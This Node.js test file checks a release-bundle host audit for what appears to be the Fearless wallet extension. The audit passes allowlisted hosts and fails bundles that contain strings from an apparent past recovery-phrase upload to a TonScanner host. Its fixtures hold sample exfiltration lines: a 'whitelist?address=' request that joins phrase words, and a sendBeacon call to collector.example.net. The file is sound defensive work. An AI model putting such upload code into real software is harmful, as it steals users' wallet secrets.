#!/usr/bin/env node

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  auditBundleHosts,
  extractNetworkHosts,
  FORBIDDEN_BUNDLE_STRINGS,
  parseHostAllowlist,
  readHostAllowlist,
} from './audit-bundle-hosts.mjs';

const scriptPath = path.join(path.dirname(fileURLToPath(import.meta.url)), 'audit-bundle-hosts.mjs');
const files = (entries) => new Map(Object.entries(entries).map(([name, text]) => [name, Buffer.from(text)]));
const allowlist = (groups) => ({ format: 'fearless-release-network-hosts', version: 1, groups });
const allowed = parseHostAllowlist(
  allowlist([{ reason: 'fixture', hosts: ['ti.soramitsu.io', 'raw.githubusercontent.com', 'www.w3.org'] }])
);
let passed = 0;

function check(name, run) {
  run();
  passed += 1;
  return name;
}

check('hosts in plain, escaped and websocket URLs', () => {
  assert.deepEqual(
    [
      ...extractNetworkHosts(
        'fetch("https://TI.soramitsu.io/api");"wss:\\/\\/relay.example.org\\/x";`https://${host}/x`;http://[::1]:8080'
      ),
    ].sort(),
    ['[::1]', 'relay.example.org', 'ti.soramitsu.io']
  );
});

check('a bundle that names only listed hosts passes', () => {
  const found = auditBundleHosts(
    files({
      'background.js': 'axios.get(`https://ti.soramitsu.io/api/indexer/v1/x`)',
      'chunks/a.js': 'fetch("https://raw.githubusercontent.com/soramitsu/x")',
      'icon.svg': '<svg xmlns="http://www.w3.org/2000/svg"/>',
    }),
    allowed
  );

  assert.deepEqual([...found.keys()].sort(), ['raw.githubusercontent.com', 'ti.soramitsu.io', 'www.w3.org']);
});

check('the 3.0.x upload path fails the build, wherever the host came from', () => {
  // As 129807f0 TonBalanceService.ts:194 built it: the host came from remote configuration.
  assert.throws(
    () => auditBundleHosts(files({ 'background.js': 'axios.get(`${ton}/whitelist?address=${a.join(";")}`)' }), allowed),
    /3\.0\.x phrase upload: background\.js: whitelist\?address/u
  );
  assert.throws(
    () => auditBundleHosts(files({ 'chunks/x.js': 'const h = "TonScanner"' }), allowed),
    /3\.0\.x phrase upload: chunks\/x\.js: tonscanner/u
  );
  // Binary files are searched for the strings too.
  assert.throws(
    () => auditBundleHosts(new Map([['wasm/a.wasm', Buffer.from([0, 1, ...Buffer.from('tonscanner.org'), 2])]]), allowed),
    /wasm\/a\.wasm: tonscanner/u
  );
});

check('a host outside the list fails the build and names the file', () => {
  assert.throws(
    () =>
      auditBundleHosts(
        files({ 'chunks/b.js': 'navigator.sendBeacon("https://collector.example.net/c")', 'a.json': '{"u":"https:\\/\\/x.example.org"}' }),
        allowed
      ),
    /outside scripts\/release-network-hosts\.json: collector\.example\.net \(chunks\/b\.js\); x\.example\.org \(a\.json\)/u
  );
});

check('the list takes exact host names with a reason, never a forbidden one', () => {
  assert.throws(() => parseHostAllowlist(allowlist([{ reason: 'x', hosts: ['*.example.org'] }])), /no wildcards/u);
  assert.throws(() => parseHostAllowlist(allowlist([{ reason: 'x', hosts: ['Example.org'] }])), /exact lower-case/u);
  assert.throws(() => parseHostAllowlist(allowlist([{ reason: '', hosts: ['example.org'] }])), /needs a reason/u);
  assert.throws(
    () => parseHostAllowlist(allowlist([{ reason: 'x', hosts: ['a.org'] }, { reason: 'y', hosts: ['a.org'] }])),
    /lists a\.org twice/u
  );
  assert.throws(() => parseHostAllowlist(allowlist([{ reason: 'x', hosts: ['tonscanner.org'] }])), /may not allow/u);
  assert.throws(() => parseHostAllowlist({ format: 'other', version: 1, groups: [] }), /format/u);
});

await (async () => {
  const reviewed = await readHostAllowlist();

  check('the reviewed list is valid and never allows the collection host', () => {
    assert.ok(reviewed.size > 0);
    assert.ok(reviewed.has('ti.soramitsu.io'));
    for (const host of reviewed.keys()) {
      assert.ok(!FORBIDDEN_BUNDLE_STRINGS.some((forbidden) => host.includes(forbidden)), host);
    }
  });
})();

const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'fearless-bundle-host-audit-'));

try {
  await fs.mkdir(path.join(tempRoot, 'chunks'));
  await fs.writeFile(path.join(tempRoot, 'chunks/a.js'), 'fetch("https://ti.soramitsu.io/api")');
  const clean = spawnSync(process.execPath, [scriptPath, '--dist', tempRoot], { encoding: 'utf8' });
  check('the command passes a clean bundle', () => assert.equal(clean.status, 0, clean.stderr));

  await fs.writeFile(path.join(tempRoot, 'chunks/b.js'), 'fetch(`${ton}/whitelist?address=${x}`)');
  const dirty = spawnSync(process.execPath, [scriptPath, '--dist', tempRoot], { encoding: 'utf8' });
  check('the command fails a bundle with the upload path', () => {
    assert.notEqual(dirty.status, 0);
    assert.match(dirty.stderr, /whitelist\?address/u);
  });
} finally {
  await fs.rm(tempRoot, { force: true, recursive: true });
}

console.log(`Bundle host audit self-test passed (${passed} checks)`);
